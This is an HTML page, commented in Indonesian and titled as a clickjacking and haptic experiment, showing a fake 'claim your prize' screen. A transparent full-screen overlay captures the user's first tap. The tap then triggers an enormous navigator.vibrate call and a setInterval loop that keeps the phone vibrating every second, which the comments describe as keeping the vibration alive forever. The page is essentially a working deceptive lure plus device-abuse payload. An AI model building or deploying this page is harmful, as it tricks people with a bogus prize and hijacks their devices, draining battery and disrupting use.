<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Clickjacking & Haptic Experiment</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
  body { 
    background: #121214; 
    color: #ffffff; 
    min-height: 100vh; 
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    overflow: hidden;
  }

  /* LAPISAN 1: Umpan Visual (Yang Dilihat Pengguna) */
  .game-layer {
    position: absolute;
    top: 0; left: 0; width: 100%; height: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    z-index: 1;
    text-align: center;
  }
  .fake-btn {
    margin-top: 20px;
    background: #007bff;
    color: white;
    padding: 15px 40px;
    font-size: 18px;
    font-weight: bold;
    border-radius: 50px;
    box-shadow: 0 4px 15px rgba(0,123,255,0.4);
    animation: pulse 1.5s infinite;
  }

  /* LAPISAN 2: Clickjacking Invisible Overlay (Yang Mengeksekusi Getar) */
  /* Lapisan ini menutupi seluruh layar secara transparan di atas game-layer */
  .invisible-overlay {
    position: absolute;
    top: 0; left: 0;
    width: 100vw;
    height: 100vh;
    background: transparent;
    opacity: 0; /* Sepenuhnya tidak terlihat */
    z-index: 999; /* Berada paling atas agar mendahului semua ketukan */
    cursor: pointer;
  }

  #status-log {
    margin-top: 30px;
    font-family: monospace;
    font-size: 11px;
    color: #00ff66;
    background: #000;
    padding: 10px;
    border-radius: 5px;
    width: 80%;
    max-width: 300px;
    text-align: left;
    min-height: 60px;
  }

  @keyframes pulse {
    0% { transform: scale(1); }
    50% { transform: scale(1.05); }
    100% { transform: scale(1); }
  }
</style>
</head>
<body>

  <!-- Lapisan Umpan Psiko/Game -->
  <div class="game-layer">
    <h2>Klaim Hadiah Anda!</h2>
    <p style="color: #aaa; margin-top: 5px; font-size: 14px;">Ketuk tombol di bawah untuk membuka hadiah.</p>
    <div class="fake-btn">KLAIM SEKARANG</div>
    
    <div id="status-log">> Menunggu interaksi pengguna...</div>
  </div>

  <!-- Lapisan Clickjacking Transparan -->
  <div class="invisible-overlay" id="victim-trigger"></div>

<script>
(function() {
  var trigger = document.getElementById('victim-trigger');
  var logBox = document.getElementById('status-log');
  var loopInterval = null;

  function writeLog(text) {
    logBox.innerHTML = "> " + text;
  }

  // Begitu pengguna mengetuk bagian mana saja di layar (karena terhalang overlay transparan)
  trigger.addEventListener('click', function(e) {
    writeLog("Gesture terdeteksi! Token akses aktif.");

    if (navigator.vibrate) {
      // 1. Eksekusi getaran angka raksasa instan memanfaatkan token yang aktif
      navigator.vibrate(999999999999999999);

      // 2. Eksploitasi Rantai Loop (Menjaga getaran tetap hidup selamanya)
      if (loopInterval === null) {
        loopInterval = setInterval(function() {
          // Memompa getaran pendek konstan setiap 1 detik
          navigator.vibrate(500);
        }, 1000);
        writeLog("🚨 GETAR LOOP AKTIF BERKELANJUTAN!");
      }
    } else {
      writeLog("Browser tidak mendukung haptik.");
    }

    // Menghilangkan overlay setelah klik pertama agar pengguna bisa berinteraksi dengan web asli di bawahnya
    trigger.style.display = 'none';
  });

})();
</script>

</body>
</html>
